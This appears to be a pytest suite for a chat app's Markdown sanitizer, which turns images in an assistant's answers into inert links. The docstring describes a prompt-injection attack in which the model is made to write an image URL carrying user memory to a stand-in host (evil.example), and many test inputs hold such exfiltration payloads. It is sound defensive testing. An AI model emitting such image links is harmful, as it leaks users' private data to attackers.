"""Images in Lili's answers are never fetched by themselves (P20).

The Markdown control loads an image as soon as it is drawn. A prompt injection
could make the model write ![](https://evil.example/?d=<a memory>) - so in her
answers images become links, and nothing that draws as an image is left.
"""
from __future__ import annotations

import random

import pytest

from views.chat import ChatMessage
from views.markdown_safety import IMAGE_MARK, WORD_JOINER, disarm_images

FENCE = "`" * 3
LINK = f"{WORD_JOINER}[{IMAGE_MARK} "


def draws_no_image(text: str) -> bool:
    return "![" not in text and "<img" not in text.lower()


@pytest.mark.parametrize(
    ("written", "shown"),
    [
        ("![диаграма](https://e.x/a.png)", f"{LINK}диаграма](https://e.x/a.png)"),
        ("виж ![](https://e.x/?d=1) тук", f"виж {LINK}](https://e.x/?d=1) тук"),
        ('![a](https://e.x/a.png "заглавие")', f'{LINK}a](https://e.x/a.png "заглавие")'),
        ("![a][1]\n\n[1]: https://e.x/a.png", f"{LINK}a][1]\n\n[1]: https://e.x/a.png"),
        ("![data](data:image/png;base64,AAAA)", f"{LINK}data](data:image/png;base64,AAAA)"),
        ('<img src="https://e.x/a.png" alt="лого">', f"{WORD_JOINER}[{IMAGE_MARK} лого](https://e.x/a.png)"),
        ("<IMG SRC=https://e.x/a.png>", f"{WORD_JOINER}[{IMAGE_MARK}](https://e.x/a.png)"),
        ("<img alt='без адрес'>", f"{IMAGE_MARK} без адрес"),
    ],
    ids=["inline", "no-alt", "title", "reference", "data-uri", "img-tag", "img-tag-unquoted", "img-tag-no-src"],
)
def test_an_image_becomes_a_link(written, shown):
    assert disarm_images(written) == shown


def test_text_without_images_is_left_alone():
    text = "Внимание! [бележка] и [връзка](https://e.x) и `код` и <b>тег</b>"
    assert disarm_images(text) is text


@pytest.mark.parametrize(
    "code",
    [
        f"{FENCE}markdown\n![alt](https://e.x/a.png)\n{FENCE}\n",
        "~~~\n![alt](https://e.x/a.png)\n<img src=x>\n~~~\n",
        "`![alt](https://e.x/a.png)`",
        # Still being streamed: the fence is not closed yet, the control draws code.
        f"{FENCE}python\nprint('![alt](https://e.x/a.png)')\n",
    ],
    ids=["fenced", "tilde-with-tag", "inline-code", "unclosed-fence"],
)
def test_code_looks_the_same_and_only_hides_an_invisible_split(code):
    shown = disarm_images(code)

    assert draws_no_image(shown)
    assert shown.replace(WORD_JOINER, "") == code


def test_an_escaped_exclamation_mark_keeps_showing_as_a_mark_and_a_link():
    # "\![x](u)" is "!" plus a link already: it is only split, not relabelled.
    assert disarm_images("\\![не](https://e.x)") == f"\\!{WORD_JOINER}[не](https://e.x)"


def test_a_backtick_in_the_info_string_opens_no_code_block():
    # So what follows is prose and the image becomes a visible link.
    shown = disarm_images(f"{FENCE}a`b\n![x](https://e.x)")

    assert shown.endswith(f"{LINK}x](https://e.x)")


def test_a_tag_still_being_streamed_is_split_and_becomes_a_link_once_whole():
    message = ChatMessage("assistant", "")

    message.append_text('<img src="https://evil.example/?d=1"')
    assert draws_no_image(message.md.value)

    message.append_text(">")
    assert message.md.value == f"{WORD_JOINER}[{IMAGE_MARK}](https://evil.example/?d=1)"


def test_the_prose_after_a_code_block_is_disarmed_as_usual():
    shown = disarm_images(f"{FENCE}\n![код](https://a)\n{FENCE}\n![after](https://b)")

    assert shown.endswith(f"{LINK}after](https://b)")


@pytest.mark.parametrize(
    "tricky",
    [
        "!![x](https://evil/1)",  # a "!" in front must not rebuild the image
        "\\`![x](https://evil/2)`",  # an escaped backtick opens no code span
        f"{FENCE}a`b\n![x](https://evil/3)",  # a backtick in the info string: no fence
        "<div>\n" + FENCE + "\n</div>\n\n![x](https://evil/4)",  # a fence inside HTML
        "!<img src=https://evil/5>",
        "\\![x](https://evil/6)",  # escaped "!": a link already, kept that way
        "\\\\![x](https://evil/7)",  # an escaped backslash: an image again
        '<img src="https://evil/8?a=![b">',
    ],
)
def test_no_trick_leaves_anything_that_draws_as_an_image(tricky):
    assert draws_no_image(disarm_images(tricky))


def test_random_mixtures_never_leave_an_image():
    # The safety must not rest on telling code from prose right: whatever the
    # mixture of fences, backticks, escapes and tags, nothing is left to fetch.
    pieces = [
        "![", "](https://evil/?d=1)", "[", "]", "!", "\\", "`", FENCE, "~~~", "\n",
        "<img src=https://evil/x>", "<IMG", " src=", ">", "текст ", "[1]: https://evil\n",
    ]
    rng = random.Random(20261108)
    for _ in range(3000):
        text = "".join(rng.choice(pieces) for _ in range(rng.randint(1, 14)))
        assert draws_no_image(disarm_images(text)), repr(text)


# ------------------------------------------------------------ the chat message
def test_an_answer_shows_the_link_and_keeps_the_text_as_written():
    written = "Ето: ![графика](https://evil.example/?d=спомен)"
    message = ChatMessage("assistant", written)

    assert draws_no_image(message.md.value)
    assert f"{IMAGE_MARK} графика](https://evil.example/?d=спомен)" in message.md.value
    assert message.text_value == written


def test_an_image_split_across_streamed_chunks_is_never_drawn():
    message = ChatMessage("assistant", "")

    # The chunk boundary falls inside the image, so disarming each piece on its
    # own would let the joined text draw as an image.
    for chunk in ["Ето: !", "[x](https://ev", "il.example/?d=1)", " край"]:
        message.append_text(chunk)
        assert draws_no_image(message.md.value)

    assert message.md.value == f"Ето: {LINK}x](https://evil.example/?d=1) край"
    assert message.text_value == "Ето: ![x](https://evil.example/?d=1) край"


@pytest.mark.asyncio
async def test_copy_gives_the_answer_as_it_was_written(mock_page):
    written = "![x](https://e.x/a.png)"
    message = ChatMessage("assistant", written, page=mock_page)

    await message.copy_to_clipboard(None)

    mock_page.set_clipboard.assert_called_once_with(written)


def test_the_users_own_message_is_shown_as_written():
    # The threat is text the model was made to write; the user's own message
    # stays exactly as typed.
    written = "![моя](https://e.x/a.png)"

    assert ChatMessage("user", written).md.value == written
